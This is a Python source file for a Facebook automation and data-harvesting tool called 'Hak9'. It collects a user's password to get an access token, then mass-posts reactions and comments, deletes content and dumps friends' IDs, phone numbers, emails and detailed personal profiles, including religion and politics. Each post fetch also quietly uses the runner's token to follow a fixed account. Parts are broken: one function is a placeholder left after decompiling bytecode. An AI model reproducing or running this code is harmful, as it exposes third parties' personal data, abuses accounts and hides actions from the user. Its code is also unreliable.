import json , sys , hashlib , os , time , marshal
from past.builtins import raw_input
from logo import logo
import requests

W = ""
G = ""
R = ""

if sys.platform in ["linux", "linux2"]:
    W = "\033[0m"
    G = "\033[32;1m"
    R = "\033[31;1m"

try:

  import json, jsonpickle
  import requests
except ImportError:
    print(logo)
    print("[!] Can't import module 'requests'\n")



jml = []
jmlgetdata = []
n = []


def baliho():
    try:
        token = open("cookie/token.log", "r").read()
        r = requests.get("https://graph.facebook.com/me?access_token=" + token)
        a = json.loads(r.text)
        name = a["name"]
        n.append(a["name"])
    except (KeyError, IOError):
        print(" " + W)
        print("F B I".center(44))
        print(W + "     [" + G + "Facebook Information" + W + "]")
        print(" ")


def show_program():
    print(G, W)


def info_ga():
    print(G, W)


def menu_bot():
    print(G, W)


def menu_reaction():
    print(G, W)


def get(data):
    print("[*] Generate access token ")
    try:
        os.mkdir("cookie")
    except OSError:
        pass
    b = open("cookie/token.log", "w")
    try:
        r = requests.get("https://api.facebook.com/restserver.php", params=data)
        a = json.loads(r.text)
        b.write(a["access_token"])
        b.close()
        print("[*] successfully generate access token")
        print("[*] Your access token is stored in cookie/token.log")
        exit()
    except KeyError:
        print("[!] Failed to generate access token")
        print("[!] Check your connection / email or password")
        os.remove("cookie/token.log")
        main()
    except requests.exceptions.ConnectionError:
        print("[!] Failed to generate access token")
        print("[!] Connection error !!!")
        os.remove("cookie/token.log")
        main()


def id():
    print("[*] login to your facebook account         ")

    id = raw_input("[?] Username : ")
    pwd = raw_input("[?] Password : ")
    API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
    data = {
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "credentials_type": "password",
        "email": id,
        "format": "JSON",
        "generate_machine_id": "1",
        "generate_session_cookies": "1",
        "locale": "en_US",
        "method": "auth.login",
        "password": pwd,
        "return_ssl_resources": "0",
        "v": "1.0",
    }
    sig = (
        "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="
        + id
        + "format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="
        + pwd
        + "return_ssl_resources=0v=1.0"
        + API_SECRET
    )
    x = hashlib.new("md5")
    x.update(sig)
    data.update({"sig": x.hexdigest()})
    get(data)


def post():
    global token, WT
    try:
        if WT == "wallpost":
            print("[*] fetching all posts id")
            r = requests.get(
                "https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token="
                + token
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["home"]["data"]:
                print("\r[*] %s retrieved   " % (i["id"])),
                sys.stdout.flush()
                time.sleep(0.1)
            return result["home"]["data"]
        elif WT == "me":
            print("[*] fetching all posts id")
            r = requests.get(
                "https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token="
                + token
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["feed"]["data"]:
                print("\r[*] %s retrieved   " % (i["id"])),
                sys.stdout.flush()
                time.sleep(0.1)
            return result["feed"]["data"]
        elif WT == "req":
            print("[*] fetching all friends requests")
            r = requests.get(
                "https://graph.facebook.com/me/friendrequests?limit=50&access_token="
                + token
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["data"]:
                print("\r[*] %s retrieved    " % (i["from"]["id"])),
                sys.stdout.flush()
                time.sleep(0.01)
            return result["data"]
        elif WT == "friends":
            print("[*] fetching all friends id")
            r = requests.get(
                "https://graph.facebook.com/me?fields=friends.limit(5000)&access_token="
                + token
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["friends"]["data"]:
                print("\r[*] %s retrieved    " % (i["id"])),
                sys.stdout.flush()
                time.sleep(0.001)
            return result["friends"]["data"]
        elif WT == "subs":
            print("[*] fetching all friends id")
            r = requests.get(
                "https://graph.facebook.com/me/subscribedto?limit=50&access_token="
                + token
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["data"]:
                print("\r[*] %s retrieved    " % (i["id"])),
                sys.stdout.flush()
                time.sleep(0.01)
            return result
        elif WT == "albums":
            print("[*] fetching all albums id")
            r = requests.get(
                "https://graph.facebook.com/me?fields=albums.limit(5000)&access_token="
                + token
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["albums"]["data"]:
                print("\r[*] %s retrieved    " % (i["id"])),
                sys.stdout.flush()
                time.sleep(0.001)
            return result["albums"]["data"]
        else:
            print("[*] fetching all posts id")
            r = requests.get(
                "https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"
                % (id, token)
            )
            requests.post(
                "https://graph.facebook.com/putriy.kaeysha/subscribers?access_token="
                + token
            )
            result = json.loads(r.text)
            for i in result["feed"]["data"]:
                print("\r[*] %s retrieved   " % (i["id"])),
                sys.stdout.flush()
                time.sleep(0.1)
            return result["feed"]["data"]
    except KeyError:
        print("[!] failed to retrieve all post id")
        print("[!] Stopped")
        bot()
    except requests.exceptions.ConnectionError:
        print("[!] Connection Error")
        print("[!] Stopped")
        bot()
    except KeyboardInterrupt:
        print("\r[!] Stopped                                      ")
        bot()


def like(posts, amount):
    global type, token, WT
    print("\r[*] All posts id successfuly retrieved            ")
    print("[*] Start")
    try:
        counter = 0
        for post in posts:
            if counter >= amount:
                break
            else:
                counter += 1
            parameters = {"access_token": token, "type": type}
            url = "https://graph.facebook.com/{0}/reactions".format(post["id"])
            s = requests.post(url, data=parameters)
            id = post["id"].split("_")[0]
            try:
                print(
                    "\r"
                    + W
                    + "["
                    + G
                    + id
                    + W
                    + "] "
                    + post["message"][:40].replace("\n", " ")
                    + "..."
                )
            except KeyError:
                try:
                    print(
                        "\r"
                        + W
                        + "["
                        + G
                        + id
                        + W
                        + "] "
                        + post["story"].replace("\n", " ")
                    )
                except KeyError:
                    print("\r" + W + "[" + G + id + W + "] Successfully liked")
        print("\r[*] Done                   ")
        menu_reaction_ask()
    except KeyboardInterrupt:
        print("\r[!] Stopped                     ")
        menu_reaction_ask()


def comment(posts, amount):
    global message, token
    print("\r[*] All posts id successfuly retrieved          ")
    print("[*] Start")
    try:
        counter = 0
        for post in posts:
            if counter >= amount:
                break
            else:
                counter += 1
            parameters = {"access_token": token, "message": message}
            url = "https://graph.facebook.com/{0}/comments".format(post["id"])
            s = requests.post(url, data=parameters)
            id = post["id"].split("_")[0]
            try:
                print(
                    W
                    + "["
                    + G
                    + id
                    + W
                    + "] "
                    + post["message"][:40].replace("\n", " ")
                    + "..."
                )
            except KeyError:
                try:
                    print(
                        W
                        + "["
                        + G
                        + id
                        + W
                        + "] "
                        + post["story"].replace("\n", " ")
                    )
                except KeyError:
                    print(
                        W + "[" + G + id + W + "] successfully commented"
                    )
        print("[*] Done")
        bot()
    except KeyboardInterrupt:
        print("\r[!] Stopped")
        bot()


def remove(posts):
    global token, WT
    print("\r[*] All post id successfully retrieved          ")
    print("[*] Start")
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            r = requests.post(
                "https://graph.facebook.com/{id}?method=delete&access_token={token}".format(
                    id=post["id"], token=token
                )
            )
            a = json.loads(r.text)
            try:
                cek = a["error"]["message"]
                print(W + "[" + R + post["id"] + W + "] Failed")
            except TypeError:
                print(W + "[" + G + post["id"] + W + "] Removed")
                counter += 1
        print("[*] done")
        bot()
    except KeyboardInterrupt:
        print("\r[!] Stopped")
        bot()


def confirm(posts):
    global token, WT
    print("\r[*] All friend requests successfully retrieved        ")
    print("[*] Start")
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            else:
                counter += 1
            r = requests.post(
                "https://graph.facebook.com/me/friends/%s?access_token=%s"
                % (post["from"]["id"], token)
            )
            a = json.loads(r.text)
            try:
                cek = a["error"]["message"]
                print(W + "[" + R + post["from"]["name"] + W + "] Failed")
            except TypeError:
                print(W + "[" + G + post["from"]["name"] + W + "] Confirmed")
        print("[*] Done")
        bot()
    except KeyboardInterrupt:
        print("\r[!] Stopped")
        bot()


def unfriend(posts):
    # The provided code snippet is a compiled Python bytecode
    # which is not directly translatable to human-readable Python code
    # without decompilation. The following is a placeholder function
    # as the original functionality cannot be determined from the bytecode.

    # Placeholder functionality
    print("This function's original behavior cannot be determined from bytecode.")


import requests
import json
import sys
import time
import os

def unfollow(posts):
    global token, WT
    print('\r[*] all id successfully retrieved    ')
    print('[*] start')
    try:
        counter = 0
        for post in posts['data']:
            if counter >= 50:
                break
            else:
                counter += 1
            r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
            a = json.loads(r.text)
            try:
                cek = a['error']['nessage']
                print(W + '[' + R + post['name'] + W + '] failed')
            except TypeError:
                print(W + '[' + G + post['name'] + W + '] unfollow')
        print('[*] done')
        bot()
    except KeyboardInterrupt:
        print('\r[!] Stopped')
        bot()

def poke(posts):
    global token, WT
    print('\r[*] all id successfully retrieved                  ')
    print('[*] start')
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            else:
                counter += 1
            r = requests.post('https://graph.facebook.com/%s/pokes?access_token=%s' % (post['id'].split('_')[0], token))
            a = json.loads(r.text)
            id = post['id'].split('_')[0]
            try:
                cek = a['error']['message']
                print(W + '[' + R + id + W + '] failed')
            except TypeError:
                print(W + '[' + G + id + W + '] pokes')
        print('[*] Done')
        bot()
    except KeyboardInterrupt:
        print('\r[!] Stopped   ')
        bot()
    except (requests.exceptions.ConnectionError):
        print('[!] Connection Error')
        bot()

def albums(posts):
    global token, WT
    print('\r[*] all id successfully retrieved                 ')
    print('[*] Start')
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            r = requests.post('https://graph.facebook.com/' + post['id'] + '?method=delete&access_token=' + token)
            a = json.loads(r.text)
            try:
                cek = a['error']['message']
                print(W + '[' + R + post['name'] + W + '] Failed')
            except TypeError:
                print(W + '[' + G + post['name'] + W + '] femoved')
        print('[*] Done')
        bot()
    except KeyboardInterrupt:
        print('\r[!] Stopped  ')
        bot()
    except (requests.exceptions.ConnectionError):
        print('[!] connection error')
        bot()

def menu_reaction_ask():
    try:
        global type
        cek = input(R + 'Hak9' + W + '/' + R + 'Bot' + W + '/' + R + 'Reaction' + W + ' >> ')
        if cek in ['1', '01']:
            type = 'LIKE'
            bot_ask()
        elif cek in ['2', '02']:
            type = 'LOVE'
            bot_ask()
        elif cek in ['3', '03']:
            type = 'WOW'
            bot_ask()
        elif cek in ['4', '04']:
            type = 'HAHA'
            bot_ask()
        elif cek in ['5', '05']:
            type = 'SAD'
            bot_ask()
        elif cek in ['6', '06']:
            type = 'ANGRY'
            bot_ask()
        elif cek.lower() == 'menu':
            menu_reaction()
            menu_reaction_ask()
        elif cek.lower() == 'exit':
            print('[!] Exiting program !!')
            sys.exit()
        elif cek.lower() == 'token':
            try:
                open('cookie/token.log')
                print('[!] an access token already exists')
                cek = input('[?] Are you sure you want to continue [Y/N] ')
                if cek.lower() != 'y':
                    print('[*] Canceling ')
                    bot()
            except IOError:
                pass
            print('\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n')
            print('[Warn] please turn off your VPN before using this feature !!!')
            id()
        elif cek in ['0', '00']:
            print('[!] back to bot menu')
            bot()
        else:
            if cek == '':
                menu_reaction_ask()
            else:
                print("[!] command '" + cek + "' not found")
                print("[!] type 'menu' to show menu bot")
                menu_reaction_ask()
    except KeyboardInterrupt:
        menu_reaction_ask()

def bot_ask():
    global id, WT, token
    print('[*] load access token ')
    try:
        token = open('cookie/token.log', 'r').read()
        print('[*] Success load access token')
    except IOError:
        print('[!] Failed load access token')
        print("[!] type 'token' to generate access token")
        menu_reaction_ask()
    WT = input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
    if WT.upper() == 'T':
        id = input('[?] id facebook : ')
        if id == '':
            print("[!] id target can't be empty")
            print('[!] Stopped')
            menu_reaction_ask()
    else:
        WT = 'wallpost'
    like(post(), 50)

def bot():
    try:
        global type, message, id, WT, token
        cek = input(R + 'Hak9' + W + '/' + R + 'Bot ' + W + '>> ')
        if cek in ['1', '01']:
            menu_reaction()
            menu_reaction_ask()
        elif cek in ['2', '02']:
            print('[*] load access token')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] Success load access token')
            except IOError:
                print('[!] Failed load access token')
                print("[!] type 'token' to generate access token")
                bot()
            WT = input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
            if WT.lower() == "w" or WT.lower() == '':
                WT = 'wallpost'
            else:
                id = input('[?] Id Target : ')
                if id == '':
                    print("[!] id target can't be empty")
                    print('[!] Stopped')
                    bot()
            print('--------------------------------------------------')
            print("  [Note] Use the '</>' symbol to change the line\n")
            message = input('[?] Your Message : ')
            if message == '':
                print("[!] Message can't be empty")
                print('[!] Stopped')
                bot()
            else:
                message = message.replace('</>', '\n')
            comment(post(), 50)
        elif cek in ['4', '04']:
            WT = 'req'
            print('[*] load access token    ')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] Success load access token')
            except IOError:
                print('[!] Failed load access token   ')
                print("[!] type 'token' to generate access token")
                bot()
            confirm(post())
        elif cek in ['3', '03']:
            WT = 'wallpost'
            print('[*] load access token    ')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] Success load access token')
            except IOError:
                print('[!] Failed load access token')
                print("[!] type 'token' to generate access token")
                bot()
            poke(post())
        elif cek in ['5', '05']:
            WT = 'me'
            print('[*] load access token    ')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] Success load access token')
            except IOError:
                print('[!] Failed load access token')
                print("[!] type 'token' to generate access token")
                bot()
            remove(post())
        elif cek in ['6', '06']:
            WT = 'friends'
            print('[*] load access token     ')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] Success load access token')
            except IOError:
                print('[!] Failed load access token')
                print("[!] type 'token' to generate access token")
                bot()
            unfriend(post())
        elif cek in ['7', '07']:
            WT = 'subs'
            print('[*] load access token      ')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] success load access token')
            except IOError:
                print('[!] Failed load access token')
                print("[!] type 'token' to generate access token")
                bot()
            unfollow(post())
        elif cek in ['8', '08']:
            WT = 'albums'
            print('[*] Load access token      ')
            try:
                token = open('cookie/token.log', 'r').read()
                print('[*] Success load access token')
            except IOError:
                print('[!] Failed load access token')
                print("[!] type 'token' to generate access token")
            albums(post())
        elif cek in ['0', '00']:
            print('[*] Back to main menu')
            main()
        elif cek.lower() == 'menu':
            menu_bot()
            bot()
        elif cek.lower() == 'exit':
            print('[!] Exiting program')
            sys.exit()
        elif cek.lower() == 'token':
            try:
                open('cookie/token.log')
                print('[!] an access token already exists')
                cek = input('[?] Are you sure you want to continue [Y/N] ')
                if cek.lower() != 'y':
                    print('[*] Canceling ')
                    bot()
            except IOError:
                pass
            print('\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n')
            print('[Warn] please turn off your VPN before using this feature !!!')
            id()
        else:
            if cek == '':
                bot()
            else:
                print("[!] command '" + cek + "' not found")
                print('[!] type "menu" to show menu bot')
                bot()
    except KeyboardInterrupt:
        bot()

def dump_id():
    print('[*] Load Access Token')
    try:
        token = open("cookie/token.log", 'r').read()
        print('[*] success load access token')
    except IOError:
        print('[!] failed load access token')
        print("[*] type 'token' to generate access token")
        main()
    try:
        os.mkdir('output')
    except OSError:
        pass
    print('[*] fetching all friends id')
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        a = json.loads(r.text)
        out = open('output/' + n[0].split(' ')[0] + '_id.txt', 'w')
        for i in a['data']:
            out.write(i['id'] + '\n')
            print('\r[*] %s retrieved' % (i['id']), end=' ')
            sys.stdout.flush()
            time.sleep(0.0001)
        out.close()
        print('\r[*] all friends id successfuly retreived')
        print('[*] file saved : output/' + n[0].split(' ')[0] + '_id.txt')
        main()
    except KeyboardInterrupt:
        print('\r[!] Stopped')
        main()
    except KeyError:
        print('[!] failed to fetch friend id')
        main()
    except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
        print('[!] Connection Error')
        print('[!] Stopped')
        main()

def dump_phone():
    print('[*] load access token')
    try:
        token = open('cookie/token.log', 'r').read()
        print('[*] Success load access token')
    except IOError:
        print('[!] failed load access token')
        print("[*] type 'token' to generate access token")
        main()
    try:
        os.mkdir('output')
    except OSError:
        pass
    print("[*] fetching all phone numbers")
    print('[*] start')
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        a = json.loads(r.text)
        out = open('output/' + n[0].split(' ')[0] + '_phone.txt', 'w')
        for i in a['data']:
            x = requests.get("https://graph.facebook.com/" + i['id'] + "?access_token=" + token)
            z = json.loads(x.text)
            try:
                out.write(z['mobile_phone'] + '\n')
                print(W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['mobile_phone'])
            except KeyError:
                pass
        out.close()
        print('[*] done')
        print("[*] all phone numbers successfuly retrieved")
        print('[*] file saved : output/' + n[0].split(' ')[0] + '_phone.txt')
        main()
    except KeyboardInterrupt:
        print('\r[!] Stopped')
        main()
    except KeyError:
        print("[!] failed to fetch all phone numbers")
        main()
    except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
        print('[!] Connection Error')
        print('[!] Stopped')
        main()

def dump_mail():
    print('[*] load access token')
    try:
        token = open('cookie/token.log', 'r').read()
        print('[*] Success load access token')
    except IOError:
        print('[!] failed load access token')
        print("[*] type 'token' to generate access token")
        main()
    try:
        os.mkdir('output')
    except OSError:
        pass
    print('[*] fetching all emails')
    print('[*] start')
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        a = json.loads(r.text)
        out = open('output/' + n[0].split(' ')[0] + '_mails.txt', 'w')
        for i in a['data']:
            x = requests.get("https://graph.facebook.com/" + i['id'] + "?access_token=" + token)
            z = json.loads(x.text)
            try:
                out.write(z['email'] + '\n')
                print(W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['email'])
            except KeyError:
                pass
        out.close()
        print('[*] done')
        print("[*] all emails successfuly retrieved")
        print('[*] file saved : output/' + n[0].split(' ')[0] + '_mails.txt')
        main()
    except KeyboardInterrupt:
        print('\r[!] Stopped')
        main()
    except KeyError:
        print("[!] failed to fetch all emails")
        main()
    except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
        print('[!] Connection Error')
        print('[!] Stopped')
        main()

def dump_id_id():
    global target_id
    print('[*] load access token')
    try:
        token = open('cookie/token.log', 'r').read()
        print('[*] Success load access token')
    except IOError:
        print('[!] failed load access token')
        print("[*] type 'token' to generate access token")
        main()
    try:
        os.mkdir('output')
    except OSError:
        pass
    print('[*] fetching all id from your friend')
    try:
        r = requests.get('https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_token={token}'.format(id=target_id, token=token))
        a = json.loads(r.text)
        out = open('output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt', 'w')
        for i in a['friends']['data']:
            out.write(i['id'] + '\n')
            print('\r[*] %s retrieved' % (i['id']), end=' ')
            sys.stdout.flush()
            time.sleep(0.0001)
        out.close()
        print('\r[*] all friends id successfuly retreived')
        print('[*] file saved : output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt')
        main()
    except KeyboardInterrupt:
        print('\r[!] Stopped')
        main()
    except KeyError:
        print('[!] failed to fetch friend id')
        try:
            os.remove('output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt')
        except OSError:
            pass
        main()
    except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
        print('[!] Connection Error')
        print('[!] Stopped')

def main():
    global target_id
    try:
        cek = input(R + 'Hak9' + W + ' >> ')
        if cek.lower() == 'get_data':
            if len(jml) == 0:
                getdata()
            else:
                print('[*] You have retrieved %s friends data' % (len(jml)))
                main()
        elif cek.lower() == 'get_info':
            print('\n' + '[*] Information Gathering [*]'.center(44) + '\n')
            search()
        elif cek.lower() == 'bot':
            menu_bot()
            bot()
        elif cek.lower() == "cat_token":
            try:
                o = open('cookie/token.log', 'r').read()
                print('[*] Your access token !!\n\n' + o + '\n')
                main()
            except IOError:
                print('[!] failed to open cookie/token.log')
                print("[!] type 'token' to generate access token")
                main()
        elif cek.lower() == 'clear':
            if sys.platform == 'win32':
                os.system('cls')
                baliho()
                main()
            else:
                os.system('clear')
                baliho()
                main()
        elif cek.lower() == 'token':
            try:
                open('cookie/token.log')
                print('[!] an access token already exists')
                cek = input('[?] Are you sure you want to continue [Y/N] ')
                if cek.lower() != 'y':
                    print('[*] Canceling ')
                    bot()
            except IOError:
                pass
            print('\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n')
            print('[Warn] please turn off your VPN before using this feature !!!')
            id()
        elif cek.lower() == 'rm_token':
            print()
            a = input("[!] type 'delete' to continue : ")
            if a.lower() == 'delete':
                try:
                    os.system('rm -rf cookie/token.log')
                    print('[*] Success delete cookie/token.log')
                    main()
                except OSError:
                    print('[*] failed to delete cookie/token.log')
                    main()
            else:
                print('[*] failed to delete cookie/token.log')
                main()
        elif cek.lower() == 'about':
            show_program()
            main()
        elif cek.lower() == 'exit':
            print("[!] Exiting Program")
            sys.exit()
        elif cek.lower() == 'help':
            info_ga()
            main()
        elif cek.lower() == 'dump_id':
            dump_id()
        elif cek.lower() == 'dump_phone':
            dump_phone()
        elif cek.lower() == 'dump_mail':
            dump_mail()
        if 'dump_' in cek.lower() and cek.lower().split('_')[2] == 'id':
            target_id = cek.lower().split('_')[1]
            dump_id_id()
        else:
            if cek == '':
                main()
            else:
                print("[!] command '" + cek + "' not found")
                print('[!] type "help" to show command')
                main()
    except KeyboardInterrupt:
        main()
    except IndexError:
        print('[!] invalid parameter on command : ' + cek)
        main()

def getdata():
    global a, token
    print('[*] Load Access Token')
    try:
        token = open("cookie/token.log", "r").read()
        print('[*] Success load access token ')
    except IOError:
        print('[!] failed to open cookie/token.log')
        print("[!] type 'token' to generate access token")
        main()
    print('[*] fetching all friends data')
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        a = json.loads(r.text)
    except KeyError:
        print('[!] Your access token is expired')
        print("[!] type 'token' to generate access token")
        main()
    except requests.exceptions.ConnectionError:
        print('[!] Connection Error')
        print('[!] Stopped')
        main()
    for i in a['data']:
        jml.append(i['id'])
        print('\r[*] fetching %s data from friends' % (len(jml)), end=' ')
        sys.stdout.flush()
        time.sleep(0.0001)
    print('\r[*] ' + str(len(jml)) + ' data of friends successfully retrieved')
    main()

def search():
    if len(jml) == 0:
        print("[!] no friend data in the database")
        print('[!] type "get_data" to collect friends data')
        main()
    else:
        pass
    target = input("[!] Search Name or Id : ")
    if target == '':
        print("[!] name or id can't be empty !!")
        search()
    else:
        info(target)

def info(target):
    global a, token
    print('[*] Searching')
    for i in a['data']:
        if target in i['name'] or target in i['id']:
            x = requests.get(f"https://graph.facebook.com/{i['id']}?access_token={token}")
            y = json.loads(x.text)
            print(' ')
            print('[-------- INFORMATION --------]'.center(44))
            try:
                print('\n[*] Id : ' + i['id'])
            except KeyError:
                pass
            try:
                print('[*] Username : ' + y['username'])
            except KeyError:
                pass
            try:
                print('[*] Email : ' + y['email'])
            except KeyError:
                pass
            try:
                print('[*] Mobile Phone : ' + y['mobile_phone'])
            except KeyError:
                pass
            try:
                print('[*] Name : ' + y['name'])
            except KeyError:
                pass
            try:
                print('[*] First name : ' + y['first_name'])
            except KeyError:
                pass
            try:
                print('[*] Middle name : ' + y['middle_name'])
            except KeyError:
                pass
            try:
                print('[*] Last name : ' + y['last_name'])
            except KeyError:
                pass
            try:
                print('[*] Locale : ' + y['locale'].split('_')[0])
            except KeyError:
                pass
            try:
                print('[*] Location : ' + y['location']['name'])
            except KeyError:
                pass
            try:
                print('[*] Hometown : ' + y['hometown']['name'])
            except KeyError:
                pass
            try:
                print('[*] Gender : ' + y['gender'])
            except KeyError:
                pass
            try:
                print('[*] Religion : ' + y['religion'])
            except KeyError:
                pass
            try:
                print('[*] Relationship status : ' + y['relationship_status'])
            except KeyError:
                pass
            try:
                print('[*] Political : ' + y['political'])
            except KeyError:
                pass
            try:
                print('[*] Work :')
                for i in y['work']:
                    try:
                        print('   [-] Position : ' + i['position']['name'])
                    except KeyError:
                        pass
                    try:
                        print('   [-] Employer : ' + i['employer']['name'])
                    except KeyError:
                        pass
                    try:
                        if i['start_date'] == "0000-00":
                            print('   [-] Start date : ---')
                        else:
                            print('   [-] Start date : ' + i['start_date'])
                    except KeyError:
                        pass
                    try:
                        if i['end_date'] == "0000-00":
                            print('   [-] End date : ---')
                        else:
                            print('   [-] End date : ' + i['end_date'])
                    except KeyError:
                        pass
                    try:
                        print('   [-] Location : ' + i['location']['name'])
                    except KeyError:
                        pass
                    print(' ')
            except KeyError:
                pass
            try:
                print('[*] Updated time : ' + y['updated_time'][:10] + ' ' + y['updated_time'][11:19])
            except KeyError:
                pass
            try:
                print('[*] Languages : ')
                for i in y['languages']:
                    try:
                        print(' ~  ' + i['name'])
                    except KeyError:
                        pass
            except KeyError:
                pass
            try:
                print('[*] Bio : ' + y['bio'])
            except KeyError:
                pass
            try:
                print('[*] Quotes : ' + y['quotes'])
            except KeyError:
                pass
            try:
                print('[*] Birthday : ' + y['birthday'].replace('/', '-'))
            except KeyError:
                pass
            try:
                print('[*] Link : ' + y['link'])
            except KeyError:
                pass
            try:
                print('[*] Favourite teams : ')
                for i in y['favorite_teams']:
                    try:
                        print('~  ' + i['name'])
                    except KeyError:
                        pass
            except KeyError:
                pass
            try:
                print('[*] School : ')
                for i in y['education']:
                    try:
                        print(' ~  ' + i['school']['name'])
                    except KeyError:
                        pass
            except KeyError:
                pass
        else:
            pass
    print(' ')
    print('[*] Done ')
    main()

if __name__ == '__main__':
    baliho()
    main()


